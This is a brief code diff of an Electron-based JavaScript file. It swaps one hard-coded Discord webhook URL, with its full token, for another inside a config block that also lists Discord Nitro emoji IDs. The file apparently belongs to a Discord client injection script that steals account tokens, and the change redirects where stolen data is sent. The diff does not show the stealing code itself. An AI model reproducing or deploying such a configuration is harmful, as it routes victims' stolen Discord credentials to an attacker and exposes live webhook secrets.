@@ -9,7 +9,7 @@ const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
-  webhook: "https://discord.com/api/webhooks/992064713238261831/b7vGiLXqlLadD-MaKZWMkLF1dFtq9N3atX2Kkv57-XBMXorV9oET7mmATsaHPsslhI4g",
+  webhook: "https://discord.com/api/webhooks/1005247144170622987/f1sErUKe6eVl_-x1wVGZmVuotnsJv_KAda7U817vVw8wci0xZoRU_HqJIwpFGgQrR-Zk",
   "embed-color": 3553599,
   emojis: {
     nitroType: "<a:nitro_type:990735596446167060>",
